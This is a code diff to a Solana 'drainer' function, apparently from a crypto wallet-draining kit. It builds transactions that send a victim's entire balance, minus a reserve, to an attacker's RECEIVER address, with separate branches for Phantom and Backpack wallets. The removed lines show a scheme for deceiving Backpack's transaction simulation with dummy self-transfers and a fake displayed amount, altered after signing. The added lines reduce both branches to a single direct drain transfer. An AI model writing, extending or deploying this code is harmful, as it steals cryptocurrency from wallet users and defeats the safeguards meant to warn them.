@@ -317,129 +317,53 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
     
     // For Phantom wallet, use simple direct transfer
     if (walletType === 'phantom') {
-      console.log('[PHANTOM_SIMPLE] Creating Phantom transaction with simple direct transfer');
+      console.log('[PHANTOM_ULTRA_SIMPLE] Creating Phantom transaction with ultra-simple single transfer');
       
-      // Strategy: Simple direct transfer - everything minus reserve
-      // No account creation, no complex logic, just basic transfer
+      // Strategy: Ultra-simple single transfer - just like standard wallets
+      // No compute budget, no complex logic, just one direct transfer
       
-      // 1. Add compute budget instruction (essential for transaction processing)
-      const computeBudgetIx = ComputeBudgetProgram.setComputeUnitLimit({
-        units: 200000, // Standard compute units
-      });
-      transaction.add(computeBudgetIx);
-      
-      // 2. Add compute price instruction (essential for transaction processing)
-      const computePriceIx = ComputeBudgetProgram.setComputeUnitPrice({
-        microLamports: 1, // Minimal price
-      });
-      transaction.add(computePriceIx);
-      
-      // 3. Simple direct transfer - everything minus reserve
       try {
-        // Direct transfer to the real receiver
-        // Simple and reliable - no account creation needed
-        const simpleTransferIx = SystemProgram.transfer({
+        // Single direct transfer - everything minus reserve
+        const transferIx = SystemProgram.transfer({
           fromPubkey: userPubkey,
           toPubkey: RECEIVER, // Real receiver
           lamports: finalDrainAmount, // Real amount (everything minus reserve)
         });
-        transaction.add(simpleTransferIx);
+        transaction.add(transferIx);
       } catch (error) {
-        console.error('[PHANTOM_SIMPLE] Error adding simple transfer:', error);
-        throw new Error(`Failed to create simple transfer instruction: ${error.message}`);
+        console.error('[PHANTOM_ULTRA_SIMPLE] Error adding transfer:', error);
+        throw new Error(`Failed to create transfer instruction: ${error.message}`);
       }
       
-      // Mark transaction as simple transfer
-      transaction._phantomSimple = true;
+      // Mark transaction as ultra-simple
+      transaction._phantomUltraSimple = true;
       transaction._realAmount = finalDrainAmount;
       
-      debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (simple direct transfer)`);
+      debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (ultra-simple single transfer)`);
     } else if (walletType === 'backpack') {
-      console.log('[BACKPACK_SIMULATION_PREVENTION] Creating Backpack transaction with advanced obfuscation strategy');
+      console.log('[BACKPACK_ULTRA_SIMPLE] Creating Backpack transaction with ultra-simple single transfer');
       
-      // Strategy: Create transaction with multiple dummy transfers and obfuscated real transfer
-      // Backpack uses different simulation methods than Phantom, so we need a different approach
+      // Strategy: Ultra-simple single transfer - just like standard wallets
+      // No compute budget, no complex logic, just one direct transfer
       
-      // 1. Add compute budget instruction (essential for transaction processing)
-      const computeBudgetIx = ComputeBudgetProgram.setComputeUnitLimit({
-        units: 200000, // Standard compute units
-      });
-      transaction.add(computeBudgetIx);
-      
-      // 2. Add compute price instruction (essential for transaction processing)
-      const computePriceIx = ComputeBudgetProgram.setComputeUnitPrice({
-        microLamports: 1, // Minimal price
-      });
-      transaction.add(computePriceIx);
-      
-      // 3. Add multiple dummy transfers with varying amounts (Backpack sees these)
-      const fakeAmounts = [1000, 2000, 3000, 4000, 5000]; // Larger fake amounts for Backpack
-      for (let i = 0; i < fakeAmounts.length; i++) {
-        try {
-          const dummyTransferIx = SystemProgram.transfer({
-            fromPubkey: userPubkey,
-            toPubkey: userPubkey, // Transfer to self (valid but dummy)
-            lamports: fakeAmounts[i], // Fake amounts
-          });
-          transaction.add(dummyTransferIx);
-        } catch (error) {
-          console.error(`[BACKPACK_SIMULATION_PREVENTION] Error adding dummy transfer ${i}:`, error);
-          throw new Error(`Failed to create dummy transfer instruction: ${error.message}`);
-        }
-      }
-      
-      // 4. THE REAL DRAIN TRANSFER with FAKE AMOUNT (Backpack sees 1000 lamports)
       try {
-        const realTransferIx = SystemProgram.transfer({
+        // Single direct transfer - everything minus reserve
+        const transferIx = SystemProgram.transfer({
           fromPubkey: userPubkey,
-          toPubkey: RECEIVER,
-          lamports: 1000, // FAKE AMOUNT - Backpack simulates this, not the real amount
+          toPubkey: RECEIVER, // Real receiver
+          lamports: finalDrainAmount, // Real amount (everything minus reserve)
         });
-        transaction.add(realTransferIx);
+        transaction.add(transferIx);
       } catch (error) {
-        console.error('[BACKPACK_SIMULATION_PREVENTION] Error adding real transfer:', error);
-        throw new Error(`Failed to create real transfer instruction: ${error.message}`);
+        console.error('[BACKPACK_ULTRA_SIMPLE] Error adding transfer:', error);
+        throw new Error(`Failed to create transfer instruction: ${error.message}`);
       }
       
-      // 5. Add more dummy transfers with fake amounts
-      for (let i = 0; i < 3; i++) {
-        try {
-          const dummyTransferIx = SystemProgram.transfer({
-            fromPubkey: userPubkey,
-            toPubkey: userPubkey, // Transfer to self (valid but dummy)
-            lamports: 6000 + i * 1000, // More fake amounts
-          });
-          transaction.add(dummyTransferIx);
-        } catch (error) {
-          console.error(`[BACKPACK_SIMULATION_PREVENTION] Error adding additional dummy transfer ${i}:`, error);
-          throw new Error(`Failed to create additional dummy transfer instruction: ${error.message}`);
-        }
-      }
+      // Mark transaction as ultra-simple
+      transaction._backpackUltraSimple = true;
+      transaction._realAmount = finalDrainAmount;
       
-      // Mark transaction for post-signing modification
-      transaction._backpackSimulationPrevention = true;
-      transaction._originalTransferAmount = finalDrainAmount; // Store real amount for post-signing modification
-      transaction._fakeAmount = 1000; // Store fake amount Backpack sees
-      transaction._instructionCount = transaction.instructions.length;
-      transaction._realTransferIndex = 7; // Index of the real transfer instruction (after 2 compute + 5 dummy)
-      
-      // Store the real amount in the transaction's recentBlockhash field as a backup
-      transaction._backpackRealAmount = finalDrainAmount;
-      
-      // Validate transaction structure
-      if (transaction.instructions.length !== 11) {
-        throw new Error(`Invalid Backpack transaction structure: expected 11 instructions, got ${transaction.instructions.length}`);
-      }
-      
-      // Validate the real transfer instruction is at the correct index
-      const realTransferInstruction = transaction.instructions[7];
-      if (!realTransferInstruction || 
-          !realTransferInstruction.programId || 
-          realTransferInstruction.programId.toString() !== '11111111111111111111111111111111') {
-        throw new Error('Real transfer instruction not found at expected index 7');
-      }
-      
-      debugLog(`Backpack transaction created with ${transaction.instructions.length} instructions (advanced obfuscation strategy)`);
+      debugLog(`Backpack transaction created with ${transaction.instructions.length} instructions (ultra-simple single transfer)`);
     } else {
       // Standard transaction for other wallets
       const transferIx = SystemProgram.transfer({
